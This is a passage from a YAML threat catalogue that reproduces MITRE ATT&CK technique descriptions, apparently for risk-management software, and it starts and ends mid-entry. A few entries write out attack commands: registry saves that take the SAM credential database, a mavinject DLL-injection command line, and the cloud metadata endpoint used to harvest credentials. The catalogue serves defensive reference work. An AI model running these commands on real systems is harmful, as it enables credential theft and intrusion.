      archival methods, such as encryption with XOR or stream ciphers implemented
      with no external library or utility references. Custom implementations of well-known
      compression algorithms have also been used.(Citation: ESET Sednit Part 2)

      https://attack.mitre.org/techniques/T1560/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1578
    ref_id: T1578
    name: Modify Cloud Compute Infrastructure
    description: 'An adversary may attempt to modify a cloud account''s compute service
      infrastructure to evade defenses. A modification to the compute service infrastructure
      can include the creation, deletion, or modification of one or more components
      such as compute instances, virtual machines, and snapshots.


      Permissions gained from the modification of infrastructure components may bypass
      restrictions that prevent access to existing infrastructure. Modifying infrastructure
      components may also allow an adversary to evade detection and remove evidence
      of their presence.(Citation: Mandiant M-Trends 2020)

      https://attack.mitre.org/techniques/T1578'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1584.008
    ref_id: T1584.008
    name: Network Devices
    description: 'Adversaries may compromise third-party network devices that can
      be used during targeting. Network devices, such as small office/home office
      (SOHO) routers, may be compromised where the adversary''s ultimate goal is not
      [Initial Access](https://attack.mitre.org/tactics/TA0001) to that environment
      -- instead leveraging these devices to support additional targeting.


      Once an adversary has control, compromised network devices can be used to launch
      additional operations, such as hosting payloads for [Phishing](https://attack.mitre.org/techniques/T1566)
      campaigns (i.e., [Link Target](https://attack.mitre.org/techniques/T1608/005))
      or enabling the required access to execute [Content Injection](https://attack.mitre.org/techniques/T1659)
      operations. Adversaries may also be able to harvest reusable credentials (i.e.,
      [Valid Accounts](https://attack.mitre.org/techniques/T1078)) from compromised
      network devices.


      Adversaries often target Internet-facing edge devices and related network appliances
      that specifically do not support robust host-based defenses.(Citation: Mandiant
      Fortinet Zero Day)(Citation: Wired Russia Cyberwar)


      Compromised network devices may be used to support subsequent [Command and Control](https://attack.mitre.org/tactics/TA0011)
      activity, such as [Hide Infrastructure](https://attack.mitre.org/techniques/T1665)
      through an established [Proxy](https://attack.mitre.org/techniques/T1090) and/or
      [Botnet](https://attack.mitre.org/techniques/T1584/005) network.(Citation: Justice
      GRU 2024)

      https://attack.mitre.org/techniques/T1584/008'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1583.008
    ref_id: T1583.008
    name: Malvertising
    description: "Adversaries may purchase online advertisements that can be abused\
      \ to distribute malware to victims. Ads can be purchased to plant as well as\
      \ favorably position artifacts in specific locations  online, such as prominently\
      \ placed within search engine results. These ads may make it more difficult\
      \ for users to distinguish between actual search results and advertisements.(Citation:\
      \ spamhaus-malvertising) Purchased ads may also target specific audiences using\
      \ the advertising network\u2019s capabilities, potentially further taking advantage\
      \ of the trust inherently given to search engines and popular websites. \n\n\
      Adversaries may purchase ads and other resources to help distribute artifacts\
      \ containing malicious code to victims. Purchased ads may attempt to impersonate\
      \ or spoof well-known brands. For example, these spoofed ads may trick victims\
      \ into clicking the ad which could then send them to a malicious domain that\
      \ may be a clone of official websites containing trojanized versions of the\
      \ advertised software.(Citation: Masquerads-Guardio)(Citation: FBI-search) Adversary\u2019\
      s efforts to create malicious domains and purchase advertisements may also be\
      \ automated at scale to better resist cleanup efforts.(Citation: sentinelone-malvertising)\
      \ \n\nMalvertising may be used to support [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)\
      \ and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), potentially\
      \ requiring limited interaction from the user if the ad contains code/exploits\
      \ that infect the target system's web browser.(Citation: BBC-malvertising)\n\
      \nAdversaries may also employ several techniques to evade detection by the advertising\
      \ network. For example, adversaries may dynamically route ad clicks to send\
      \ automated crawler/policy enforcer traffic to benign sites while validating\
      \ potential targets then sending victims referred from real ad clicks to malicious\
      \ pages. This infection vector may therefore remain hidden from the ad network\
      \ as well as any visitor not reaching the malicious sites with a valid identifier\
      \ from clicking on the advertisement.(Citation: Masquerads-Guardio) Other tricks,\
      \ such as intentional typos to avoid brand reputation monitoring, may also be\
      \ used to evade automated detection.(Citation: spamhaus-malvertising)\nhttps://attack.mitre.org/techniques/T1583/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1069
    ref_id: T1069
    name: Permission Groups Discovery
    description: 'Adversaries may attempt to discover group and permission settings.
      This information can help adversaries determine which user accounts and groups
      are available, the membership of users in particular groups, and which users
      and groups have elevated permissions.


      Adversaries may attempt to discover group permission settings in many different
      ways. This data may provide the adversary with information about the compromised
      environment that can be used in follow-on activity and targeting.(Citation:
      CrowdStrike BloodHound April 2018)

      https://attack.mitre.org/techniques/T1069'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1114
    ref_id: T1114
    name: Email Collection
    description: 'Adversaries may target user email to collect sensitive information.
      Emails may contain sensitive data, including trade secrets or personal information,
      that can prove valuable to adversaries. Emails may also contain details of ongoing
      incident response operations, which may allow adversaries to adjust their techniques
      in order to maintain persistence or evade defenses.(Citation: TrustedSec OOB
      Communications)(Citation: CISA AA20-352A 2021) Adversaries can collect or forward
      email from mail servers or clients.

      https://attack.mitre.org/techniques/T1114'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1003.002
    ref_id: T1003.002
    name: Security Account Manager
    description: "Adversaries may attempt to extract credential material from the\
      \ Security Account Manager (SAM) database either through in-memory techniques\
      \ or through the Windows Registry where the SAM database is stored. The SAM\
      \ is a database file that contains local accounts for the host, typically those\
      \ found with the <code>net user</code> command. Enumerating the SAM database\
      \ requires SYSTEM level access.\n\nA number of tools can be used to retrieve\
      \ the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* [gsecdump](https://attack.mitre.org/software/S0008)\n\
      * [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\n\
      Alternatively, the SAM can be extracted from the Registry with Reg:\n\n* <code>reg\
      \ save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\n\
      Creddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation:\
      \ GitHub Creddump7)\n\nNotes: \n\n* RID 500 account is the local, built-in administrator.\n\
      * RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.\n\
      https://attack.mitre.org/techniques/T1003/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1596.002
    ref_id: T1596.002
    name: WHOIS
    description: 'Adversaries may search public WHOIS data for information about victims
      that can be used during targeting. WHOIS data is stored by regional Internet
      registries (RIR) responsible for allocating and assigning Internet resources
      such as domain names. Anyone can query WHOIS servers for information about a
      registered domain, such as assigned IP blocks, contact information, and DNS
      nameservers.(Citation: WHOIS)


      Adversaries may search WHOIS data to gather actionable information. Threat actors
      can use online resources or command-line utilities to pillage through WHOIS
      data for information about potential victims. Information from these sources
      may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595)
      or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing
      operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)
      or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),
      and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)
      or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).

      https://attack.mitre.org/techniques/T1596/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1542.001
    ref_id: T1542.001
    name: System Firmware
    description: 'Adversaries may modify system firmware to persist on systems.The
      BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface
      (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware
      that operate as the software interface between the operating system and hardware
      of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation:
      About UEFI)


      System firmware like BIOS and (U)EFI underly the functionality of a computer
      and may be modified by an adversary to perform or assist in malicious activity.
      Capabilities exist to overwrite the system firmware, which may give sophisticated
      adversaries a means to install malicious firmware updates as a means of persistence
      on a system that may be difficult to detect.

      https://attack.mitre.org/techniques/T1542/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1594
    ref_id: T1594
    name: Search Victim-Owned Websites
    description: 'Adversaries may search websites owned by the victim for information
      that can be used during targeting. Victim-owned websites may contain a variety
      of details, including names of departments/divisions, physical locations, and
      data about key employees such as names, roles, and contact info (ex: [Email
      Addresses](https://attack.mitre.org/techniques/T1589/002)). These sites may
      also have details highlighting business operations and relationships.(Citation:
      Comparitech Leak)


      Adversaries may search victim-owned websites to gather actionable information.
      Information from these sources may reveal opportunities for other forms of reconnaissance
      (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or
      [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)),
      establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585)
      or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or
      initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)
      or [Phishing](https://attack.mitre.org/techniques/T1566)).


      In addition to manually browsing the website, adversaries may attempt to identify
      hidden directories or files that could contain additional sensitive information
      or vulnerable functionality. They may do this through automated activities such
      as [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003), as well
      as by leveraging files such as sitemap.xml and robots.txt.(Citation: Perez Sitemap
      XML 2023)(Citation: Register Robots TXT 2015)

      https://attack.mitre.org/techniques/T1594'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1069.003
    ref_id: T1069.003
    name: Cloud Groups
    description: 'Adversaries may attempt to find cloud groups and permission settings.
      The knowledge of cloud permission groups can help adversaries determine the
      particular roles of users and groups within an environment, as well as which
      users are associated with a particular group.


      With authenticated access there are several tools that can be used to find permissions
      groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain
      roles and permissions groups for Exchange and Office 365 accounts (Citation:
      Microsoft Msolrole)(Citation: GitHub Raindance).


      Azure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces
      to obtain permissions groups. The command <code>az ad user get-member-groups</code>
      will list groups associated to a user account for Azure while the API endpoint
      <code>GET https://cloudidentity.googleapis.com/v1/groups</code> lists group
      resources available to a user for Google.(Citation: Microsoft AZ CLI)(Citation:
      Black Hills Red Teaming MS AD Azure, 2018)(Citation: Google Cloud Identity API
      Documentation) In AWS, the commands `ListRolePolicies` and `ListAttachedRolePolicies`
      allow users to enumerate the policies attached to a role.(Citation: Palo Alto
      Unit 42 Compromised Cloud Compute Credentials 2022)


      Adversaries may attempt to list ACLs for objects to determine the owner and
      other accounts with access to the object, for example, via the AWS <code>GetBucketAcl</code>
      API (Citation: AWS Get Bucket ACL). Using this information an adversary can
      target accounts with permissions to a given object or leverage accounts they
      have already compromised to access the object.

      https://attack.mitre.org/techniques/T1069/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.011
    ref_id: T1574.011
    name: Services Registry Permissions Weakness
    description: "Adversaries may execute their own malicious payloads by hijacking\
      \ the Registry entries used by services. Adversaries may use flaws in the permissions\
      \ for Registry keys related to services to redirect from the originally specified\
      \ executable to one that they control, in order to launch their own code when\
      \ a service starts. Windows stores local service configuration information in\
      \ the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>.\
      \ The information stored under a service's Registry keys can be manipulated\
      \ to modify a service's execution parameters through tools such as the service\
      \ controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001),\
      \ or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys\
      \ is controlled through access control lists and user permissions. (Citation:\
      \ Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions\
      \ for users and groups are not properly set and allow access to the Registry\
      \ keys for a service, adversaries may change the service's binPath/ImagePath\
      \ to point to a different executable under their control. When the service starts\
      \ or is restarted, then the adversary-controlled program will execute, allowing\
      \ the adversary to establish persistence and/or privilege escalation to the\
      \ account context the service is set to execute under (local/domain account,\
      \ SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other\
      \ Registry keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code>\
      \ key may be changed so that the service is executed in an elevated context\
      \ anytime the service fails or is intentionally corrupted.(Citation: Kansa Service\
      \ related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code>\
      \ key contains the name of a driver service's performance DLL and the names\
      \ of several exported functions in the DLL.(Citation: microsoft_services_registry_tree)\
      \ If the <code>Performance</code> key is not already present and if an adversary-controlled\
      \ user has the <code>Create Subkey</code> permission, adversaries may create\
      \ the <code>Performance</code> key in the service\u2019s Registry tree to point\
      \ to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also\
      \ add the <code>Parameters</code> key, which stores driver-specific data, or\
      \ other custom subkeys for their malicious services to establish persistence\
      \ or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation:\
      \ troj_zegost) Additionally, If adversaries launch their malicious services\
      \ using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\\
      SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation:\
      \ malware_hides_service)\nhttps://attack.mitre.org/techniques/T1574/011"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1596.001
    ref_id: T1596.001
    name: DNS/Passive DNS
    description: "Adversaries may search DNS data for information about victims that\
      \ can be used during targeting. DNS information may include a variety of details,\
      \ including registered name servers as well as records that outline addressing\
      \ for a target\u2019s subdomains, mail servers, and other hosts.\n\nAdversaries\
      \ may search DNS data to gather actionable information. Threat actors can query\
      \ nameservers for a target organization directly, or search through centralized\
      \ repositories of logged DNS query responses (known as passive DNS).(Citation:\
      \ DNS Dumpster)(Citation: Circl Passive DNS) Adversaries may also seek and target\
      \ DNS misconfigurations/leaks that reveal information about internal networks.\
      \ Information from these sources may reveal opportunities for other forms of\
      \ reconnaissance (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)\
      \ or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),\
      \ establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)\
      \ or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),\
      \ and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)\
      \ or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).\nhttps://attack.mitre.org/techniques/T1596/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1499.003
    ref_id: T1499.003
    name: Application Exhaustion Flood
    description: 'Adversaries may target resource intensive features of applications
      to cause a denial of service (DoS), denying availability to those applications.
      For example, specific features in web applications may be highly resource intensive.
      Repeated requests to those features may be able to exhaust system resources
      and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport
      Jan 2018)

      https://attack.mitre.org/techniques/T1499/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1195.001
    ref_id: T1195.001
    name: Compromise Software Dependencies and Development Tools
    description: "Adversaries may manipulate software dependencies and development\
      \ tools prior to receipt by a final consumer for the purpose of data or system\
      \ compromise. Applications often depend on external software to function properly.\
      \ Popular open source projects that are used as dependencies in many applications\
      \ may be targeted as a means to add malicious code to users of the dependency.(Citation:\
      \ Trendmicro NPM Compromise)  \n\nTargeting may be specific to a desired victim\
      \ set or may be distributed to a broad set of consumers but only move on to\
      \ additional tactics on specific victims.\nhttps://attack.mitre.org/techniques/T1195/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1588.004
    ref_id: T1588.004
    name: Digital Certificates
    description: 'Adversaries may buy and/or steal SSL/TLS certificates that can be
      used during targeting. SSL/TLS certificates are designed to instill trust. They
      include information about the key, information about its owner''s identity,
      and the digital signature of an entity that has verified the certificate''s
      contents are correct. If the signature is valid, and the person examining the
      certificate trusts the signer, then they know they can use that key to communicate
      with its owner.


      Adversaries may purchase or steal SSL/TLS certificates to further their operations,
      such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002)
      with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even
      enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)
      if the certificate is trusted or otherwise added to the root of trust (i.e.
      [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)).
      The purchase of digital certificates may be done using a front organization
      or using information stolen from a previously compromised entity that allows
      the adversary to validate to a certificate provider as that entity. Adversaries
      may also steal certificate materials directly from a compromised third-party,
      including from certificate authorities.(Citation: DiginotarCompromise) Adversaries
      may register or hijack domains that they will later purchase an SSL/TLS certificate
      for.


      Certificate authorities exist that allow adversaries to acquire SSL/TLS certificates,
      such as domain validation certificates, for free.(Citation: Let''s Encrypt FAQ)


      After obtaining a digital certificate, an adversary may then install that certificate
      (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003))
      on infrastructure under their control.

      https://attack.mitre.org/techniques/T1588/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1583.002
    ref_id: T1583.002
    name: DNS Server
    description: 'Adversaries may set up their own Domain Name System (DNS) servers
      that can be used during targeting. During post-compromise activity, adversaries
      may utilize DNS traffic for various tasks, including for Command and Control
      (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)).
      Instead of hijacking existing DNS servers, adversaries may opt to configure
      and run their own DNS servers in support of operations.


      By running their own DNS servers, adversaries can have more control over how
      they administer server-side DNS C2 traffic ([DNS](https://attack.mitre.org/techniques/T1071/004)).
      With control over a DNS server, adversaries can configure DNS applications to
      provide conditional responses to malware and, generally, have more flexibility
      in the structure of the DNS-based C2 channel.(Citation: Unit42 DNS Mar 2019)

      https://attack.mitre.org/techniques/T1583/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1561
    ref_id: T1561
    name: Disk Wipe
    description: 'Adversaries may wipe or corrupt raw disk data on specific systems
      or in large numbers in a network to interrupt availability to system and network
      resources. With direct write access to a disk, adversaries may attempt to overwrite
      portions of disk data. Adversaries may opt to wipe arbitrary portions of disk
      data and/or wipe disk structures like the master boot record (MBR). A complete
      wipe of all disk sectors may be attempted.


      To maximize impact on the target organization in operations where network-wide
      availability interruption is the goal, malware used for wiping disks may have
      worm-like features to propagate across a network by leveraging additional techniques
      like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential
      Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin
      Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster
      Destructive Malware)


      On network devices, adversaries may wipe configuration files and other data
      from the device using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
      commands such as `erase`.(Citation: erase_cmd_cisco)

      https://attack.mitre.org/techniques/T1561'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1071.004
    ref_id: T1071.004
    name: DNS
    description: "Adversaries may communicate using the Domain Name System (DNS) application\
      \ layer protocol to avoid detection/network filtering by blending in with existing\
      \ traffic. Commands to the remote system, and often the results of those commands,\
      \ will be embedded within the protocol traffic between the client and server.\
      \ \n\nThe DNS protocol serves an administrative function in computer networking\
      \ and thus may be very common in environments. DNS traffic may also be allowed\
      \ even before network authentication is completed. DNS packets contain many\
      \ fields and headers in which data can be concealed. Often known as DNS tunneling,\
      \ adversaries may abuse DNS to communicate with systems under their control\
      \ within a victim network while also mimicking normal, expected traffic.(Citation:\
      \ PAN DNS Tunneling)(Citation: Medium DnsTunneling)\nhttps://attack.mitre.org/techniques/T1071/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1552.005
    ref_id: T1552.005
    name: Cloud Instance Metadata API
    description: 'Adversaries may attempt to access the Cloud Instance Metadata API
      to collect credentials and other sensitive data.


      Most cloud service providers support a Cloud Instance Metadata API which is
      a service provided to running virtual instances that allows applications to
      access information about the running virtual instance. Available information
      generally includes name, security group, and additional metadata including sensitive
      data such as credentials and UserData scripts that may contain additional secrets.
      The Instance Metadata API is provided as a convenience to assist in managing
      applications and is accessible by anyone who can access the instance.(Citation:
      AWS Instance Metadata API) A cloud metadata API has been used in at least one
      high profile compromise.(Citation: Krebs Capital One August 2019)


      If adversaries have a presence on the running virtual instance, they may query
      the Instance Metadata API directly to identify credentials that grant access
      to additional resources. Additionally, adversaries may exploit a Server-Side
      Request Forgery (SSRF) vulnerability in a public facing web proxy that allows
      them to gain access to the sensitive information via a request to the Instance
      Metadata API.(Citation: RedLock Instance Metadata API 2018)


      The de facto standard across cloud service providers is to host the Instance
      Metadata API at <code>http[:]//169.254.169.254</code>.

      https://attack.mitre.org/techniques/T1552/005'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1555.002
    ref_id: T1555.002
    name: Securityd Memory
    description: "An adversary with root access may gather credentials by reading\
      \ `securityd`\u2019s memory. `securityd` is a service/daemon responsible for\
      \ implementing security protocols such as encryption and authorization.(Citation:\
      \ Apple Dev SecurityD) A privileged adversary may be able to scan through `securityd`'s\
      \ memory to find the correct sequence of keys to decrypt the user\u2019s logon\
      \ keychain. This may provide the adversary with various plaintext passwords,\
      \ such as those for users, WiFi, mail, browsers, certificates, secure notes,\
      \ etc.(Citation: OS X Keychain)(Citation: OSX Keydnap malware)\n\nIn OS X prior\
      \ to El Capitan, users with root access can read plaintext keychain passwords\
      \ of logged-in users because Apple\u2019s keychain implementation allows these\
      \ credentials to be cached so that users are not repeatedly prompted for passwords.(Citation:\
      \ OS X Keychain)(Citation: External to DA, the OS X Way) Apple\u2019s `securityd`\
      \ utility takes the user\u2019s logon password, encrypts it with PBKDF2, and\
      \ stores this master key in memory. Apple also uses a set of keys and algorithms\
      \ to encrypt the user\u2019s password, but once the master key is found, an\
      \ adversary need only iterate over the other values to unlock the final password.(Citation:\
      \ OS X Keychain)\nhttps://attack.mitre.org/techniques/T1555/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1615
    ref_id: T1615
    name: Group Policy Discovery
    description: 'Adversaries may gather information on Group Policy settings to identify
      paths for privilege escalation, security measures applied within a domain, and
      to discover patterns in domain objects that can be manipulated or used to blend
      in the environment. Group Policy allows for centralized management of user and
      computer settings in Active Directory (AD). Group policy objects (GPOs) are
      containers for group policy settings made up of files stored within a predictable
      network path `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`.(Citation: TechNet Group
      Policy Basics)(Citation: ADSecurity GPO Persistence 2016)


      Adversaries may use commands such as <code>gpresult</code> or various publicly
      available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>,
      to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation:
      Github PowerShell Empire) Adversaries may use this information to shape follow-on
      behaviors, including determining potential attack paths within the target network
      as well as opportunities to manipulate Group Policy settings (i.e. [Domain or
      Tenant Policy Modification](https://attack.mitre.org/techniques/T1484)) for
      their benefit.

      https://attack.mitre.org/techniques/T1615'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1542.003
    ref_id: T1542.003
    name: Bootkit
    description: 'Adversaries may use bootkits to persist on systems. Bootkits reside
      at a layer below the operating system and may make it difficult to perform full
      remediation unless an organization suspects one was used and can act accordingly.


      A bootkit is a malware variant that modifies the boot sectors of a hard drive,
      including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation:
      Mandiant M Trends 2016) The MBR is the section of disk that is first loaded
      after completing hardware initialization by the BIOS. It is the location of
      the boot loader. An adversary who has raw access to the boot drive may overwrite
      this area, diverting execution during startup from the normal boot loader to
      adversary code. (Citation: Lau 2011)


      The MBR passes control of the boot process to the VBR. Similar to the case of
      MBR, an adversary who has raw access to the boot drive may overwrite the VBR
      to divert execution during startup to adversary code.

      https://attack.mitre.org/techniques/T1542/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1025
    ref_id: T1025
    name: Data from Removable Media
    description: "Adversaries may search connected removable media on computers they\
      \ have compromised to find files of interest. Sensitive data can be collected\
      \ from any removable media (optical disk drive, USB memory, etc.) connected\
      \ to the compromised system prior to Exfiltration. Interactive command shells\
      \ may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106)\
      \ may be used to gather information. \n\nSome adversaries may also use [Automated\
      \ Collection](https://attack.mitre.org/techniques/T1119) on removable media.\n\
      https://attack.mitre.org/techniques/T1025"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.013
    ref_id: T1218.013
    name: Mavinject
    description: "Adversaries may abuse mavinject.exe to proxy execution of malicious\
      \ code. Mavinject.exe is the Microsoft Application Virtualization Injector,\
      \ a Windows utility that can inject code into external processes as part of\
      \ Microsoft Application Virtualization (App-V).(Citation: LOLBAS Mavinject)\n\
      \nAdversaries may abuse mavinject.exe to inject malicious DLLs into running\
      \ processes (i.e. [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001)),\
      \ allowing for arbitrary code execution (ex. <code>C:\\Windows\\system32\\mavinject.exe\
      \ PID /INJECTRUNNING PATH_DLL</code>).(Citation: ATT Lazarus TTP Evolution)(Citation:\
      \ Reaqta Mavinject) Since mavinject.exe may be digitally signed by Microsoft,\
      \ proxying execution via this method may evade detection by security products\
      \ because the execution is masked under a legitimate process. \n\nIn addition\
      \ to [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001),\
      \ Mavinject.exe can also be abused to perform import descriptor injection via\
      \ its  <code>/HMODULE</code> command-line parameter (ex. <code>mavinject.exe\
      \ PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>). This command would\
      \ inject an import table entry consisting of the specified DLL into the module\
      \ at the given base address.(Citation: Mavinject Functionality Deconstructed)\n\
      https://attack.mitre.org/techniques/T1218/013"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1074.001
    ref_id: T1074.001
    name: Local Data Staging
    description: 'Adversaries may stage collected data in a central location or directory
      on the local system prior to Exfiltration. Data may be kept in separate files
      or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560).
      Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106)
      and bash may be used to copy data into a staging location.


      Adversaries may also stage collected data in various available formats/locations
      of a system, including local storage databases/repositories or the Windows Registry.(Citation:
      Prevailion DarkWatchman 2021)

      https://attack.mitre.org/techniques/T1074/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.005
    ref_id: T1036.005
    name: Match Legitimate Name or Location
    description: 'Adversaries may match or approximate the name or location of legitimate
      files or resources when naming/placing them. This is done for the sake of evading
      defenses and observation. This may be done by placing an executable in a commonly
      trusted directory (ex: under System32) or giving it the name of a legitimate,
      trusted program (ex: svchost.exe). In containerized environments, this may also
      be done by creating a resource in a namespace that matches the naming convention
      of a container pod or cluster. Alternatively, a file or container image name
      given may be a close approximation to legitimate programs/images or something
      innocuous.


      Adversaries may also use the same icon of the file they are trying to mimic.

      https://attack.mitre.org/techniques/T1036/005'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1587.003
    ref_id: T1587.003
    name: Digital Certificates
    description: 'Adversaries may create self-signed SSL/TLS certificates that can
      be used during targeting. SSL/TLS certificates are designed to instill trust.
      They include information about the key, information about its owner''s identity,
      and the digital signature of an entity that has verified the certificate''s
      contents are correct. If the signature is valid, and the person examining the
      certificate trusts the signer, then they know they can use that key to communicate
      with its owner. In the case of self-signing, digital certificates will lack
      the element of trust associated with the signature of a third-party certificate
      authority (CA).


      Adversaries may create self-signed SSL/TLS certificates that can be used to
      further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002)
      with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even
      enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)
      if added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)).


      After creating a digital certificate, an adversary may then install that certificate
      (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003))
      on infrastructure under their control.

      https://attack.mitre.org/techniques/T1587/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1565.001
    ref_id: T1565.001
    name: Stored Data Manipulation
    description: 'Adversaries may insert, delete, or manipulate data at rest in order
      to influence external outcomes or hide activity, thus threatening the integrity
      of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018)
      By manipulating stored data, adversaries may attempt to affect a business process,
      organizational understanding, and decision making.


      Stored data could include a variety of file formats, such as Office files, databases,
      stored emails, and custom file formats. The type of modification and the impact
      it will have depends on the type of data as well as the goals and objectives
      of the adversary. For complex systems, an adversary would likely need special
      expertise and possibly access to specialized software related to the system
      that would typically be gained through a prolonged information gathering campaign
      in order to have the desired impact.

      https://attack.mitre.org/techniques/T1565/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1110.002
    ref_id: T1110.002
    name: Password Cracking
    description: "Adversaries may use password cracking to attempt to recover usable\
      \ credentials, such as plaintext passwords, when credential material such as\
      \ password hashes are obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)\
      \ can be used to obtain password hashes, this may only get an adversary so far\
      \ when [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) is not\
      \ an option. Further,  adversaries may leverage [Data from Configuration Repository](https://attack.mitre.org/techniques/T1602)\
      \ in order to obtain hashed credentials for network devices.(Citation: US-CERT-TA18-106A)\
      \ \n\nTechniques to systematically guess the passwords used to compute hashes\
      \ are available, or the adversary may use a pre-computed rainbow table to crack\
      \ hashes. Cracking hashes is usually done on adversary-controlled systems outside\
      \ of the target network.(Citation: Wikipedia Password cracking) The resulting\
      \ plaintext password resulting from a successfully cracked hash may be used\
      \ to log into systems, resources, and services in which the account has access.\n\
      https://attack.mitre.org/techniques/T1110/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1114.001
    ref_id: T1114.001
    name: Local Email Collection
    description: "Adversaries may target user email on local systems to collect sensitive\
      \ information. Files containing email data can be acquired from a user\u2019\
      s local system, such as Outlook storage or cache files.\n\nOutlook stores data\
      \ locally in offline data files with an extension of .ost. Outlook 2010 and\
      \ later supports .ost file sizes up to 50GB, while earlier versions of Outlook\
      \ support up to 20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook\
      \ 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed\
